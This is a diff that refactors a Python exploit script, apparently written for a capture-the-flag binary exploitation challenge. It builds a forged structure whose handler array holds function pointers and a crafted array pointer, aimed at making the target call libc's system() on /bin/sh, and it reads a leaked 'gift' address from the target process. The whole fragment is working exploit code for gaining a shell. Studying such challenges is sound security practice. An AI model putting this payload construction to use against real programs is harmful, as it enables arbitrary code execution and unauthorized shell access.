@@ -15,45 +15,44 @@ HANDLER_SZ, HAS_ID = 0x28, True
 
 
 def header(array_ptr, used):
-    return p64(used) + p64(used) + p64(array_ptr)
+    return p64(used) * 2 + p64(array_ptr)
 
 
 def handler_array(*funcs):
     assert funcs
-    if not HAS_ID:
-        data = bytearray(HANDLER_SZ * len(funcs) - 0x18)
-        for off, fn in zip(range(0, len(data), HANDLER_SZ), funcs[::-1]):
-            data[off : off + 8] = p64(fn)
-        """
-        After testing, when using libc's system() and /bin/sh,
-        there's no need to fill the trailing zeros. Only if
-        writing a custom /bin/sh string, the trailing zeros
-        are needed to avoid issues, but also, just aligning to
-        8 bytes is sufficient. Add a b"\x00\x00" e.g. is enough,
-        like return bytes(data).rstrip(b'\x00') + b"\x00\x00".
-        """
-        return bytes(data).rstrip(b"\x00") + b"\x00\x00"
-    else:
-        data = bytearray(HANDLER_SZ * len(funcs))
-        for i, fn in enumerate(funcs[::-1]):
-            off = i * HANDLER_SZ
-            data[off : off + 8] = p64(fn)
+    n = len(funcs)
+    total = HANDLER_SZ * n - (0x18 if not HAS_ID else 0)
+    data = bytearray(total)
+
+    for i, fn in enumerate(funcs[::-1]):
+        off = i * HANDLER_SZ
+        data[off : off + 8] = p64(fn)
+        if HAS_ID:
             data[off + 0x20 : off + 0x28] = p64(i)
-        return bytes(data).rstrip(b"\x00") + b"\x00\x00"
+
+    """
+    After testing, when using libc's system() and /bin/sh,
+    there's no need to fill the trailing zeros. Only if
+    writing a custom /bin/sh string, the trailing zeros
+    are needed to avoid issues, but also, just aligning to
+    8 bytes is sufficient. Add a b"\x00\x00" e.g. is enough,
+    like return bytes(data).rstrip(b'\x00') + b"\x00\x00".
+    """
+    return bytes(data).rstrip(b"\x00") + b"\x00\x00"
 
 
 def forge(base, *funcs, rdi=None):
     assert funcs
-    arr = handler_array(*funcs)
+    n = len(funcs)
 
     if rdi is None:
-        used = len(funcs)
+        used = n
         array_ptr = base + 0x18
     else:
         used = rdi
-        array_ptr = (base + 0x18 - (used - len(funcs)) * HANDLER_SZ) % (1 << 64)
+        array_ptr = (base + 0x18 - (used - n) * HANDLER_SZ) & 0xFFFFFFFFFFFFFFFF
 
-    return header(array_ptr, used) + arr
+    return header(array_ptr, used) + handler_array(*funcs)
 
 
 io.recvuntil(b"gift: ")
